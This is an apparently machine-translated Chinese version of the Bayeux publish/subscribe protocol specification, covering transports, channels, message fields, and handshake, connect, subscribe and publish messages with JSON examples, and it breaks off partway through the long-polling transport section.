JavaScript对象表示法（JSON）是一种轻量级的数据交换格式。人类阅读和写作很容易。机器解析和生成很容易。它基于JavaScript编程语言的一个子集，标准ECMA-262第3版 - 1999年12月.JSON在http://www.json.org/中有描述。


整体运作
-------

###HTTP传输

HTTP协议是一个请求/响应协议。客户端以请求方法，URI和协议版本的形式向服务器发送请求，然后通过与服务器的连接，发送包含请求修饰符，客户端信息和可选主体内容的类MIME消息。服务器响应一个状态行，包括消息的协议版本和成功或错误代码，后面是包含服务器信息，实体元信息和可能的实体主体内容的MIME类消息。

服务器可能不会发起与客户端的连接，也不会向客户端发送未请求的响应，因此异步事件不能从服务器传递到客户端，除非先前发出的请求存在。为了允许双向异步通信，Bayeux支持在客户端和服务器之间使用多个HTTP连接，以便先前发出的请求可用于将服务器传输到客户端消息。

RFC 2616第8.1.4节的建议是单个客户端不应该与任何服务器保持2个以上的连接，因此Bayeux协议不得要求服务器同时处理超过2个HTTP请求来处理来自客户的所有应用程序（基于Bayeux或其他）的请求。

###非HTTP传输

尽管HTTP是互联网上使用的主要传输协议，但并不打算它将成为Bayeux的唯一传输协议。可以使用支持请求/响应范例的其他传输（例如，WebSocket不是请求/响应协议，但支持请求/响应范例）。但是，为了清楚起见，本文档假设使用HTTP。当采用非HTTP连接级传输机制时，符合规范的Bayeux服务器和客户端必须仍然符合本文档中概述的JSON编码消息的语义。

本文档中描述的几种“传输类型”主要由它们如何封装用于通过HTTP传送的消息以及由客户端启动的HTTP连接的顺序和内容来区分。虽然这可能看起来像是一群关注读者的实现问题，但是在不指定这些语义的情况下创建可互操作实现的困难是开发本规范的主要动机。如果部署的服务器和客户端更灵活，则可能没有必要开发Bayeux。

无论如何，在本规范的制定过程中都注意确保未来实现不同连接级别策略和编码的客户端和服务器可能仍会发展并继续遵循Bayeux实现，只要它们实现基于JSON的公共/订阅这里概述的语义。

本文档的其余部分讲述HTTP将用于消息传输。

>注意
>>本文档的其余部分讲述HTTP将用于消息传输。

###JavaScript

用JavaScript实现的在浏览器安全框架内运行的Bayeux客户端必须遵守浏览器施加的限制，例如相同的源策略或CORS规范或线程模型。 这些限制通常由浏览器本身强制执行，但客户端实施必须了解这些限制并遵守这些限制。

使用JavaScript实现但不在浏览器中运行的Bayeux客户端可以放宽浏览器施加的限制。

###客户端到服务器事件传递

Bayeux事件通过客户端发起的HTTP请求从客户端发送到服务器，并通过零个或多个中介（代理，网关或隧道）链传输到源服务器：

BC ---------- U ---------- P ------------ O ---------- BS
 | --M0(E)--> |            |              |            |
 |            | ---HTTP request(M0(E))--> |            |
 |            |            |              | --M0(E)--> |
 |            |            |              | <---M1---- |
 |            | <---HTTP response(M1)---- |            |
 | <---M1---  |            |              |            |
 |            |            |              |            |

上图表示封装在Bayeux消息M0中的Bayeux事件E，该Bayeux事件E经由代理P经由从用户代理U发送到源服务器O的HTTP请求从Bayeux客户端BC发送到Bayeux服务器BS .HTTP响应 包含另一个Bayeux消息M1，它至少包含对M0的协议响应，但可能包含在服务器或其他客户端上启动的其他Bayeux事件。

###服务器到客户端事件传递

Bayeux事件从服务器发送到客户端，通过HTTP响应发送到客户端预计发送的HTTP请求，并通过零个或多个中介（代理，网关或隧道）链传输到源服务器：

BC ---------- U ---------- P ------------ O ---------- BS
 | ---M0--->  |            |              |            |
 |            | --- HTTP request(M0) ---> |            |
 |            |            |              | ----M0---> |
 ~            ~            ~              ~            ~ wait
 |            |            |              | <--M1(E)-- |
 |            | <--HTTP response(M1(E))-- |            |
 | <--M1(E)-- |            |              |            |
 ~            ~            ~              ~            ~

上图表示Bayeux消息M0从Bayeux客户端BC经由代理P经由从用户代理U发送到源服务器O的HTTP请求发送到Bayeux服务器BS。消息M0是在预期 Bayeux事件从服务器传递到客户端，Bayeux服务器在发送响应之前等待这样的事件。 显示Bayeux事件E在HTTP响应中经由Bayeux消息M1被递送。 M1可能包含零个，一个或多个发往Bayeux客户端的Bayeux事件。

用于将事件从服务器发送到客户端的传输可能会在传递M1之后终止HTTP响应（并不意味着连接已关闭），或者使用技术使HTTP响应未完成并将其他消息传输到客户端。

###轮询运输
轮询传输将在发送所有可用的Bayeux消息后始终终止HTTP响应。

BC ---------- U ---------- P ------------ O ---------- BS
 | ---M0--->  |            |              |            |
 |            | --- HTTP request(M0) ---> |            |
 |            |            |              | ----M0---> |
 ~            ~            ~              ~            ~ wait
 |            |            |              | <--M1(E)-- |
 |            | <--HTTP response(M1(E))-- |            |
 | <--M1(E)-- |            |              |            |
 | ---M2--->  |            |              |            |
 |            | --- HTTP request(M2) ---> |            |
 |            |            |              | ----M2---> |
 ~            ~            ~              ~            ~ wait

在接收到包含M1的HTTP响应时，Bayeux客户端立即或间隔后发布新的Bayeux消息M2，以预期从服务器到客户端传送更多事件。 Bayeux实现必须支持称为长轮询的特定轮询传输方式（另请参阅长轮询传输部分）。

###流媒体传输
一些Bayeux传输使用流技术（也称为永久响应），允许在相同的HTTP响应中发送多个消息：

BC ---------- U ---------- P ------------ O ---------- BS
 | ---M0--->  |            |              |            |
 |            | --- HTTP request(M0) ---> |            |
 |            |            |              | ----M0---> |
 ~            ~            ~              ~            ~ wait
 |            |            |              | <--M1(E0)- |
 |            | <--HTTP response(M1(E0))- |            |
 | <--M1(E0)- |            |              |            |
 ~            ~            ~              ~            ~ wait
 |            |            |              | <--M1(E1)- |
 |            | <----(M1(E1))------------ |            |
 | <--M1(E1)- |            |              |            |
 ~            ~            ~              ~            ~ wait

流式传输技术避免了预期请求的延迟和额外消息传递，但是需要实现用户代理和代理服务器，因为它们需要将不完整的HTTP响应传递给Bayeux客户端。

###两个连接操作
为了实现双向通信，Bayeux客户端使用2个HTTP连接（另请参阅http传输部分）连接到Bayeux服务器，以便服务器到客户端和客户端到服务器的消息传递可以异步发生：

BC ---------- U ---------- P ------------ O ---------- BS
 | ---M0--->  |            |              |            |
 |            | ------ req0(M0) --------> |            |
 |            |            |              | ----M0---> |
 ~            ~            ~              ~            ~ wait
 | --M1(E1)-> |            |              |            |
 |            | ----- req1(M1(E1))------> |            |
 |            |            |              | --M1(E1)-> |
 |            |            |              | <---M2---- |
 |            | <---- resp1(M2)---------- |            |
 | <---M2---  |            |              |            |
 ~            ~            ~              ~            ~ wait
 |            |            |              | <-M3(E2)-- |
 |            | <-----resp2(M3(E2))------ |            |
 | <-M3(E2)-- |            |              |            |
 | ---M4--->  |            |              |            |
 |            | ------req3(M4)----------> |            |
 |            |            |              | ----M4---> |
 ~            ~            ~              ~            ~ wait

HTTP请求req0和req1是在不同的TCP / IP连接上发送的，因此可以在对req0的响应之前发送对req1的响应。 实现必须控制HTTP流水线，以便req1不会在req0后排队，从而强制响应的排序。

###连接谈判
Bayeux连接在客户端和服务器之间通过握手消息进行协商，这些消息允许在客户端和服务器之间就连接类型，身份验证和其他参数达成一致。

BC ----------------------------------------- BS
 | ------------------ handshake request ---> |
 | <---- handshake response ---------------- |
 | -------------------- connect request ---> |
 ~                                           ~ wait
 | <------ connect response ---------------- |

Bayeux连接协商可能是迭代的，在获得成功连接之前可能会交换多个握手消息。 服务器还可以通过发送不成功的连接响应和建议以重新连接握手消息来请求Bayeux连接重新协商。

BC ----------------------------------------- BS
 | ------------------ handshake request ---> |
 | <-- unsuccessful handshake response ----- |
 | ------------------ handshake request ---> |
 | <-- successful handshake response ------- |
 | -------------------- connect request ---> |
 ~                                           ~ wait
 | <------ connect response ---------------- |
 | -------------------- connect request ---> |
 | <---- unsuccessful connect response ----- |
 | ------------------ handshake request ---> |
 | <-- successful handshake response ------- |
 | -------------------- connect request ---> |
 ~                                           ~ wait
 | <------ connect response ---------------- |

未连接的操作
可选地，可以在没有事先握手的情况下发送消息（另见发布部分）。

BC ----------------------------------------- BS
 | ------------------- message request ----> |
 | <---- message response ------------------ |


在为Bayeux服务器实现非浏览器客户端时，此模式通常很有用。 这些客户端通常只是希望向Bayeux服务器可能提供服务的其他客户端发送消息，但不希望自己倾听事件。

Bayeux服务器可以支持在没有事先握手的情况下发送的消息，但是在任何情况下都必须响应这些消息（最终带有错误消息）。

###客户端状态表

-------------++------------+-------------+------------+------------
State/Event  || handshake  | Timeout     | Successful | Disconnect
             ||  request   |             |   connect  |  request
             ||   sent     |             |  response  |   sent
-------------++------------+-------------+----------- +------------
UNCONNECTED  || CONNECTING | UNCONNECTED |            |
CONNECTING   ||            | UNCONNECTED | CONNECTED  | UNCONNECTED
CONNECTED    ||            | UNCONNECTED |            | UNCONNECTED
-------------++------------+-------------+------------+------------


 协议元素 
---------
###共同的元素

用于Bayeux名称和标识符的字符由BNF定义定义：

alpha    = lowalpha | upalpha

lowalpha = "a" | "b" | "c" | "d" | "e" | "f" | "g" | "h" | "i" |
           "j" | "k" | "l" | "m" | "n" | "o" | "p" | "q" | "r" |
           "s" | "t" | "u" | "v" | "w" | "x" | "y" | "z"

upalpha  = "A" | "B" | "C" | "D" | "E" | "F" | "G" | "H" | "I" |
           "J" | "K" | "L" | "M" | "N" | "O" | "P" | "Q" | "R" |
           "S" | "T" | "U" | "V" | "W" | "X" | "Y" | "Z"

digit    = "0" | "1" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9"

alphanum = alpha | digit

mark     = "-" | "_" | "!" | "~" | "(" | ")" | "$" | "@"

string   = *( alphanum | mark | " " | "/" | "*" | "." )

token    = ( alphanum | mark ) *( alphanum | mark )

integer  = digit *( digit )

###通道

通道由标识为不带参数的URI的绝对路径组件的名称标识。这是频道名称的BNF定义：

	channel_name =“/”channel_segments
	channel_segments = channel_segment *（“/”channel_segment）
	channel_segment =token

通道名称由一个首字母/后跟一个由单斜杠/字符分隔的可选路径段序列组成。在路径段中，字符/被保留。

自/ meta /开始的通道名称保留用于Bayeux协议（另请参阅元通道部分）。从/ service /开始的通道名称对于Bayeux协议具有特殊含义（另请参阅服务通道部分）。示例非元渠道名称是：

	/foo/bar
	Regular channel name
	
	/foo-bar/(foobar)
	Channel name with dash and parenthesis

###频道通配符

一组通道可以用通道匹配模式指定：

	channel_pattern = *（“/”channel_segment）“/”wild_card
	wild_card =“*”| “**”

通道模式仅支持*的匹配单个段或**匹配多个段的尾随通配符。示例通道模式是：

/foo/*

匹配/ foo / bar和/ foo / boo。不符合/ foo，/ foobar或/ foo / bar / boo。

/foo/**

匹配/ foo / bar，/ foo / boo和/ foo / bar / boo。不符合/ foo，/ foobar或/ foobar / boo。

###元渠道

从/ meta / segment开始的通道是Bayeux协议本身使用的通道。本地服务器端Bayeux客户端可以，远程Bayeux客户端不应该订阅（另请参阅bayeux订阅部分）到元信道。发布到元信道的消息不得通过Bayeux服务器分发给远程客户端。元信道的服务器端处理程序可以发布仅传递给发送原始请求消息的客户端的响应消息。如果发布到元信道的消息包含一个id字段，则传递给客户端的任何响应消息必须包含一个具有相同值的id字段。

###服务渠道
从/服务/频道段开始的频道是专用于帮助请求/响应式消息的特殊频道。发布到服务渠道的消息不会分发给任何远程Bayeux客户端。服务通道的处理程序可以向发布请求消息的客户端发送响应消息。服务器不应记录他们收到的订阅服务频道。如果发布到服务通道的消息包含id字段，则任何响应消息都应包含具有相同值或来自请求ID的值的id字段。请求/响应操作在服务通道操作部分有详细描述。

###版本
协议版本是一个整数，后跟一个可选的“。”。字母数字元素的分隔序列：
	
	version = integer *（“。”version_element）
	version_element = alphanum *（alphanum |“ - ”|“_”）
逐个元素进行版本比较，对每个元素应用正常的字母数字比较。

###客户端ID

客户端ID是一个随机的，不可预测的字母数字字符序列：
	
	clientId = alphanum *（alphanum）

客户端ID由服务器生成，应该使用包含至少128个真正随机位的强大随机算法来创建。服务器必须确保客户端ID是唯一的，并且应该尝试避免重用客户端ID。客户端ID被编码为字符串。另请参阅clientId字段部分。

###消息
Bayeux消息是JSON编码的对象，它包含代表字段和值的无序序列的名称值对。值可以是简单的字符串，数字，布尔值或复杂的JSON编码对象或数组。一个Bayeux消息必须包含一个且只有一个信道字段，它决定了消息的类型和允许的字段。

所有Bayeux消息应该封装在JSON编码数组中，以便多个消息可以一起传输。 Bayeux客户端或服务器必须接受任意一组消息，并且可以接受一条消息。 JSON编码的消息或消息数组本身通常封装在传输特定的格式和编码中。以下是JSON编码数组中表示从客户端发送到服务器的事件中的Bayeux消息示例：

	[{
	    "channel": "/some/name",
	    "clientId": "83js73jsh29sjd92",
	    "data": { "myapp" : "specific data", value: 100 }
	}]

### 通用消息字段定义 

####渠道

信道消息字段必须包含在每个Bayeux消息中以指定消息的来源或目的地。在请求中，通道指定了消息的目的地，并在响应中指定了消息的来源。

####版本

版本消息字段务必包含在/ meta / handshake通道中的消息中，以表示客户端/服务器期望的协议版本。

####最早版本

minimumVersion消息字段可以包含在去往/来自/ meta / handshake通道的消息中，以指示客户端/服务器可以处理的最早的协议版本。

####支持连接类型

supportedConnectionTypes字段包含在/ meta / handshake通道中的消息中，以允许客户端和服务器显示受支持的传输。该值是一个字符串数组，每个字符串表示一个传输名称。定义的连接类型包括：

长轮询

该运输在长轮询运输部分中定义。

回调轮询

此传输在回调轮询传输部分中定义

IFRAME

使用隐藏的iframe元素的文档内容的可选传输。

flash

使用浏览器Flash插件功能的可选传输。

所有的服务器和客户端实现必须支持长轮询连接类型，并且应该支持回调轮询。所有其他连接类型都是可选的。

####clientId
clientId消息字段唯一标识Bayeux服务器的客户端。除了发送到/ meta / handshake频道的消息之外，clientId消息字段必须包含在发送到服务器的每个消息中，并且可以在发布消息中省略（另请参阅事件消息部分）。 clientId消息字段可以在消息响应中返回，除了失败的握手请求以及发送没有clientId的消息响应。但是，在广播消息时，必须注意不要将clientId泄漏给其他客户端，因为这样会允许其他客户端冒充clientId被泄露的客户端。

####建议
通知消息字段为服务器提供了一种通知客户端首选客户端操作模式的方式，以便与服务器实施的限制相结合，Bayeux实现可以防止资源耗尽和不合理的故障模式。

此外，通知消息字段为客户端提供了一种通知服务器其首选操作模式的方式，以便他们可以更好地向客户端应用程序通知与应用程序相关的状态更改（例如，连接状态更改）。

通知字段是一个JSON编码对象，其中包含通用和传输特定值，用于指示操作模式，超时和其他潜在的传输特定参数。建议字段可能出现在建议对象的顶层或建议对象的特定于传输层的部分中。

除非在事件消息部分和传输部分中另有说明，否则任何Bayeux响应消息都可能包含建议字段。收到的建议总是取代任何以前收到的建议。

服务器发送的示例通知字段是：

	"advice": {
	    "reconnect": "retry",
	    "timeout": 30000,
	    "interval": 1000,
	    "callback-polling": {
	        "reconnect": "handshake"
	    }
	}
客户发送的示例建议字段是：

	"advice": {
	    "timeout": 0
	}



- 重新连接建议字段

重新连接通知字段是一个字符串，指示客户端在连接失败的情况下应如何处理。定义的重新连接建议字段值为：

重试

客户端可能会尝试在时间间隔（由间隔建议字段或客户端默认退避定义）以及相同的凭证之后重新连接/ meta / connect消息。

握手

服务器已经终止了任何以前的连接状态，客户端必须重新连接/ meta / handshake消息。当收到重新连接建议握手时，客户端不能自动重试。

空

表示尝试连接时发生硬故障。客户端必须尊重重新连接通知，并且不能自动重试或握手。
任何不实现所有定义的重新连接值的客户端不能自动重试或握手。



- 超时建议字段

一个整数，表示服务器延迟对/ meta / connect通道的响应的时间周期（以毫秒为单位）。

此值仅供客户参考。 Bayeux服务器应该承认客户发送的超时通知。



- 间隔建议字段

一个整数，表示客户端将后续请求延迟到/ meta / connect通道的最小时间段（以毫秒为单位）。消极时期表示该消息不应重试。

客户端必须实现间隔支持，但客户端可能超过服务器提供的时间间隔。如果没有收到新建议，服务器请求失败，客户端应该执行退避策略来增加间隔



- 多客户建议字段

这是一个布尔字段，如果为true，则表示服务器已检测到在同一Web客户端中运行的多个Bayeux客户端实例。



- 主持咨询领域

这是一串字符串字段，如果存在，则表示可以用作客户端可以连接的备用服务器的主机名或IP地址列表。如果客户端收到重新握手的建议，并且当前服务器未包含在提供的主机列表中，则客户端应该尝试使用主机，直到建立成功的连接。与列表中的主持人握手期间收到的建议将取代以前收到的任何建议。

###连接类型

connectionType消息字段指定客户端进行通信所需的传输类型。 connectionType消息字段必须包含在/ meta / connect通道的请求消息中。连接类型在受支持的连接部分列出。

- ID
一个ID消息字段可以包含在带有字母数字值的任何Bayeux消息中：

id = alphanum *（alphanum）

ID的生成是特定于实现的，并且可以由应用程序提供。发布到/ meta / **和/ service / **的消息应该有连接中唯一的id字段。

为响应传递给/ meta / **频道的消息而发送的消息必须使用与请求消息相同的消息ID。

响应传递给/ service / **通道的消息而发送的消息应该使用与请求消息相同的消息ID或从请求消息ID派生的ID。

- 时间戳

时间戳消息字段应该在下面的ISO 8601配置文件中指定（所有时间应该以GMT时间发送）：

YYYY-MM-DDTHH：MM：SS.SS
时间戳消息字段在所有Bayeux消息中都是可选的。

- 数据

数据消息字段是包含事件信息的任意JSON编码对象。数据消息字段必须包含在发布消息中，并且Bayeux服务器必须将数据消息字段包含在事件传递消息中。

- 成功

布尔成功消息字段用于指示成功或失败，并且必须包含在对/ meta / handshake，/ meta / connect，/ meta / subscribe，/ meta / unsubscribe，/ meta / disconnect和发布频道的响应中。

- 订阅

订阅消息字段指定客户希望订阅或取消订阅的频道。订阅消息字段必须包含在/ meta / subscribe / / meta / unsubscribe频道的请求和响应中。

- 错误

在任何Bayeux响应中，错误消息字段都是可选的。错误消息字段可以指示请求返回错误成功消息时发生的错误类型。错误消息字段应按以下格式以字符串形式发送：

	error            = error_code ":" error_args ":" error_message
	                 | error_code ":" ":" error_message
	error_code       = digit digit digit
	error_args       = string *( "," string )
	error_message    = string

示例错误字符串是：

	401::No client ID
	402:xj3sjdsjdsjad:Unknown Client ID
	403:xj3sjdsjdsjad,/foo/bar:Subscription denied
	404:/foo/bar:Unknown Channel

- EXT

一个分机消息字段可以包含在任何贝叶消息中。它的值应该是JSON编码的对象，顶层名称由实现名称来区分（例如“com.acme.ext.auth”）。

ext消息字段的内容可以是允许扩展在服务器和客户端实现之间协商和实现的任意值。

- ConnectionId
在Bayeux协议的开发过程中使用了connectionId消息字段，现在不推荐使用它，并且不应该使用它。

- json-comment-filtered
握手消息的json-comment-filtered消息字段已弃用，不应使用。


 元信息字段定义 
--------------

###握手

- 握手请求

Bayeux客户端通过向/ meta / handshake频道发送消息来启动连接协商。

在HTTP相同域连接的情况下，握手请求务必通过长轮询传输发送到服务器，而对于跨域连接，握手请求可能与长轮询传输一起发送，并且通过回调轮询传输失败。

握手请求必须包含以下消息字段：


渠道
该值必须是/ meta / handshake

版本
客户端支持的协议版本

supportedConnectionTypes
	
为了正在协商的连接的目的，客户端支持的连接类型的数组（另请参阅受支持的连接部分）。如果客户希望协商特定的连接类型，该列表可以是实际支持的连接类型的子集。
握手请求可以包含消息字段：

minimumVersion

客户端支持的协议的最低版本

EXT

扩展对象

ID

消息ID

客户端不应该在握手消息的请求中发送任何其他消息。服务器必须忽略与握手消息在同一请求中发送的任何其他消息。示例握手请求是：
	[{
	    "channel": "/meta/handshake",
	    "version": "1.0",
	    "minimumVersion": "1.0beta",
	    "supportedConnectionTypes": ["long-polling", "callback-polling", "iframe"]
	}]

- 握手回应

Bayeux服务器必须通过握手响应消息响应握手请求。握手响应如何格式化取决于客户端和服务器之间达成的传输协议。



- 成功握手回应

成功的握手响应必须包含消息字段：

渠道
该值必须是/ meta / handshake

版本
协商的协议版本

supportedConnectionTypes
为了正在协商的连接，服务器支持的连接类型。如果服务器希望协商特定连接类型，该列表可以是实际支持的连接类型的子集。该列表必须至少包含一个与handshake请求中提供的supportedConnectionType相同的元素。如果没有共同的连接类型，握手响应必须不成功。

clientId
新生成的唯一ID字符串。

成功
值为true
成功的握手响应可能包含消息字段：

minimumVersion
服务器支持的协议的最低版本

忠告
建议对象

EXT
扩展对象

ID
与请求消息ID相同的值

authSuccessful
值为真;可以包含此字段以支持需要authSuccessful字段的原型客户端实现
成功的握手响应示例如下：

	[{
	    "channel": "/meta/handshake",
	    "version": "1.0",
	    "minimumVersion": "1.0beta",
	    "supportedConnectionTypes": ["long-polling","callback-polling"],
	    "clientId": "Un1q31d3nt1f13r",
	    "successful": true,
	    "authSuccessful": true,
	    "advice": { "reconnect": "retry" }
	}]

- 不成功的握手响应

不成功的握手响应必须包含消息字段：

渠道
该值必须是/ meta / handshake

成功
值为false

错误
一个描述失败原因的字符串
不成功的握手响应可能包含消息字段：

supportedConnectionTypes
为了正在协商的连接，服务器支持的连接类型。如果服务器希望协商特定连接类型，该列表可以是实际支持的连接类型的子集。

忠告
建议对象

版
协商的协议版本

minimumVersion
服务器支持的协议的最低版本

EXT
扩展对象

ID
与请求消息ID相同的值
一个不成功的握手响应示例是：

	[{
	    "channel": "/meta/handshake",
	    "version": "1.0",
	    "minimumVersion": "1.0beta",
	    "supportedConnectionTypes": ["long-polling","callback-polling"],
	    "successful": false,
	    "error": "Authentication failed",
	    "advice": { "reconnect": "none" }
	}]
对于复杂的连接协商，可以在Bayeux客户端和服务器之间交换多个握手消息。握手响应将成功的消息字段设置为false，直到握手过程完成。建议和外部消息字段可用于传达完成握手过程所需的附加信息。使用握手的重新连接建议字段的不成功的握手响应用于继续连接协商。使用重新连接通知字段为none的不成功握手响应用于终止连接协商。

 连接 
------

####连接请求

在Bayeux客户端通过握手交换发现服务器功能后，通过向/ meta / connect通道发送消息来建立连接。该消息可以通过握手响应中由服务器支持的任何指示的传输来传输。

连接请求必须包含消息字段：



- 渠道
该值必须是/ meta / connect



- clientId
客户端ID在握手响应中返回



- 连接类型
用于此连接的客户端使用的连接类型。
连接请求可能包含消息字段：



- EXT
扩展对象



- ID
消息ID
客户端可以在同一个HTTP请求中发送其他消息和连接消息。

示例连接请求是：

	[{
	    "channel": "/meta/connect",
	    "clientId": "Un1q31d3nt1f13r",
	    "connectionType": "long-polling"
	}]

一个传输必须保持一个并且只有一个未完成的连接消息。当包含/ meta / connect响应的HTTP响应终止时，客户端必须至少等待上一次收到的建议中指定的时间间隔，然后才能按照建议重新建立连接。

####连接响应

Bayeux服务器必须通过用于请求的同一传输器响应连接请求并发出连接响应消息。

Bayeux服务器可能会等待响应，直到需要传送给客户端的客户端的预订频道中有可用的事件消息。

连接响应必须包含消息字段：



- 渠道
值必须是/ meta / connect



- 成功
表示连接成功或失败的布尔值
连接响应可能包含消息字段：



- 错误
一个描述失败原因的字符串



- 建议
建议对象



- EXT
扩展对象



- clientId
客户端ID在握手响应中返回



- ID
与请求消息ID相同的值
示例连接响应是：
	
	[{
	    "channel": "/meta/connect",
	    "successful": true,
	    "error": "",
	    "clientId": "Un1q31d3nt1f13r",
	    "advice": { "reconnect": "retry" }
	}]
客户端必须只保留一个未完成的连接消息。如果服务器没有当前的未完成连接，并且在配置的超时时间内未收到连接，则服务器应该看起来好像收到了断开连接消息。

 断开 
------

#断开请求

当连接的客户端希望停止操作时，它应该向/ meta / disconnect通道发送请求，以便服务器删除任何与客户端相关的状态。服务器应该释放任何等待元消息处理程序。 Bayeux客户端应用程序应当在用户关闭浏览器窗口或离开当前页面时发送断开连接请求。 Bayeux服务器不应仅仅依靠客户端发送断开连接消息来删除客户端相关的状态信息，因为断开连接消息可能不会从客户端发送，或者断开连接请求可能无法到达服务器。

断开请求必须包含消息字段：



- 渠道
该值必须是/ meta / disconnect



- clientId
客户端ID在握手响应中返回
断开连接请求可能包含消息字段：



- EXT
扩展对象



- ID
消息ID
示例断开请求是：

[{
    "channel": "/meta/disconnect",
    "clientId": "Un1q31d3nt1f13r"
}]

**断开响应**

Bayeux服务器必须响应断开连接请求和断开响应。

断开连接响应必须包含消息字段：



- 渠道
该值必须是/ meta / disconnect



- 成功
布尔值指示断开请求的成功或失败
断开连接响应可能包含消息字段：



- clientId
客户端ID在握手响应中返回



- 错误
一个描述失败原因的字符串



- EXT
扩展对象



- ID
与请求消息ID相同的值
示例断开响应是：
	
	[{
	    "channel": "/meta/disconnect",
	    "successful": true
	}]


订阅 
----
####订阅请求

连接的Bayeux客户端可以发送订阅消息来注册对频道的兴趣，并请求将发布到该频道的消息发送给自己。

订阅请求必须包含消息字段：



- 渠道
该值必须是/ meta / subscribe



- clientId
客户端ID在握手响应中返回



- 订阅
频道名称或频道模式或频道名称和频道模式阵列。
订阅请求可以包含消息字段：



- EXT
扩展对象



- ID
消息ID

示例订阅请求是：

	[{
	    "channel": "/meta/subscribe",
	    "clientId": "Un1q31d3nt1f13r",
	    "subscription": "/foo/**"
	}]

####订阅响应

Bayeux服务器必须通过订阅响应消息来响应订阅请求。

Bayeux服务器可以在与订阅响应相同的HTTP响应中发送客户端的事件消息，包括刚刚订阅的频道的事件。

订阅响应必须包含消息字段：



- 渠道
该值必须是/ meta / subscribe



- 成功
表示订阅成功或失败的布尔值



- 订阅
频道名称或频道模式或频道名称和频道模式阵列。
订阅响应可能包含消息字段：



- 错误
一个描述失败原因的字符串



- 忠告
建议对象



- EXT
扩展对象



- clientId
客户端ID在握手响应中返回



- ID
与请求消息ID相同的值
一个成功的订阅响应示例是：

	[{
	    "channel": "/meta/subscribe",
	    "clientId": "Un1q31d3nt1f13r",
	    "subscription": "/foo/**",
	    "successful": true,
	    "error": ""
	}]

一个失败的订阅响应示例是：

	[{
	    "channel": "/meta/subscribe",
	    "clientId": "Un1q31d3nt1f13r",
	    "subscription": "/bar/baz",
	    "successful": false,
	    "error": "403:/bar/baz:Permission Denied"
	}]

 退订
------

####取消订阅请求

连接的Bayeux客户端可以发送取消订阅消息来取消对频道的兴趣，并请求发布到该频道的消息不会发送给自己。

取消订阅请求必须包含消息字段：



- 渠道
该值必须是/ meta / unsubscribe



- clientId
客户端ID在握手响应中返回



- 订阅
频道名称或频道模式或频道名称和频道模式阵列。
取消订阅请求可能包含消息字段：



- EXT
扩展对象



- ID
消息ID
示例取消订阅请求是：
	
	[{
	    "channel": "/meta/unsubscribe",
	    "clientId": "Un1q31d3nt1f13r",
	    "subscription": "/foo/**"
	}]

####取消订阅响应

Bayeux服务器必须通过取消订阅响应消息来响应取消订阅请求。

Bayeux服务器可以在与退订订阅相同的HTTP响应中发送客户端的事件消息，包括只要退订订阅之前处理事件就退订的订阅通道的事件。

取消订阅响应必须包含消息字段：



- 渠道
该值必须是/ meta / unsubscribe



- 成功
表示取消订阅操作成功或失败的布尔值



- 订阅
频道名称或频道模式或频道名称和频道模式阵列。
取消订阅响应可能包含消息字段：



- 错误
一个描述失败原因的字符串



- 建议
建议对象



- EXT
扩展对象



- clientId
客户端ID在握手响应中返回



- ID
与请求消息ID相同的值
一个取消订阅回应的例子是：

	[{
	    "channel": "/meta/unsubscribe",
	    "clientId": "Un1q31d3nt1f13r",
	    "subscription": "/foo/**",
	    "successful": true,
	    "error": ""
	}]

####事件消息字段定义 
应用程序事件发布在从Bayeux客户端发送到Bayeux服务器的事件消息中，并通过从Bayeux服务器发送到Bayeux客户端的事件消息中发送。

发布 
-----
####发布请求 

Bayeux客户端可以通过发送事件消息来发布频道上的事件。事件消息可以在新的HTTP请求中发送，或者可以在与握手元消息以外的消息相同的HTTP请求中发送。

发布消息可以从未连接的客户端（未执行握手，因此没有客户端ID）发送。服务器接受未连接的发布请求是可选的，并且在这样做之前应该应用服务器特定的身份验证和授权。

发布事件消息必须包含消息字段：



- 渠道
消息发布的渠道



- 数据
消息数据作为任意JSON编码对象
发布事件消息可以包含消息字段：



- clientId
客户端ID在握手响应中返回



- ID
客户端生成的消息的唯一ID



- EXT
扩展对象
示例事件消息是：
[{
    "channel": "/some/channel",
    "clientId": "Un1q31d3nt1f13r",
    "data": "some application string or JSON encoded object",
    "id": "some unique message id"
}]

####发布响应

Bayeux服务器可以用发布事件确认来响应发布事件消息。

发布事件消息响应必须包含消息字段：



- 渠道
消息发布的渠道



- 成功
表示发布成功或失败的布尔值
发布事件响应可能包含消息字段：



- ID
消息ID



- 错误
一个描述失败原因的字符串



- EXT
扩展对象
示例事件响应消息是：

	[{
	    "channel": "/some/channel",
	    "successful": true,
	    "id": "some unique message id"
	}]

####送达

如果客户端订阅了事件消息的频道，则必须将事件消息发送给客户端。事件消息可以作为除/ meta / handshake响应以外的任何其他消息以相同的HTTP响应发送到客户端。如果一个Bayeux服务器有多个来自同一个客户端的HTTP请求，服务器应该在HTTP响应中提供所有可用的消息，这些消息将立即发送，而不是唤醒等待连接元消息请求。事件消息传送可能未被客户确认。

传递事件消息必须包含消息字段：



- 渠道
消息发布的渠道



- 数据
该消息作为任意JSON编码对象
交付事件响应可能包含消息字段：



- ID
来自发布商的唯一消息ID



- EXT
扩展对象



- 建议
建议对象
示例事件传递消息是：

	[{
	    "channel": "/some/channel",
	    "data": "some application string or JSON encoded object",
	    "id": "some unique message id"
	}]

 运输 
-----

####长轮询运输

“长轮询”传输是轮询传输，它试图最小化服务器 - 客户端消息传递的延迟以及连接所需的处理/网络资源。在“传统”轮询中，即使没有要发送的事件，服务器也会立即发送和终止对请求的响应，最差的延迟是每个客户端请求之间的轮询延迟。长轮询服务器实现尝试保持打开每个请求，直到有事件要传递;目标是始终有一个待处理的请求用于传递事件，从而最大限度地减少消息传递的延迟。通过使用重新连接和间隔建议字段来限制客户端，从而在最坏的情况下退化为传统的轮询行为，从而解决服务器负载和资源匮乏问题。

长轮询请求消息

消息应该作为UTF-8编码的应用程序/ json HTTP POST请求的主体发送到服务器。或者，可以将消息作为应用程序/ x-www-form-urlencoded编码的POST请求的消息参数发送到服务器。如果以编码形式发送，则Bayeux消息以下列形式之一作为消息参数发送：

- 单值并包含单个Bayeux消息

- 单值并包含一组Bayeux消息

- 多值并包含几个单独的Bayeux消息
 
- 多值并包含多个Bayeux消息阵列

- Multi值包含Bayeux消息和Bayeux消息数组的混合

长轮询响应消息

消息应该以UTF-8编码的内容类型application / json作为HTTP POST响应的非封装主体内容发送给客户端。

长轮询响应消息可以包含建议字段，该字段包含特定于传输的字段以指示传输的操作模式。对于长轮询运输，建议字段可能包含以下字段：



- 时间到
服务器将持有长轮询请求的毫秒数



- 间隔
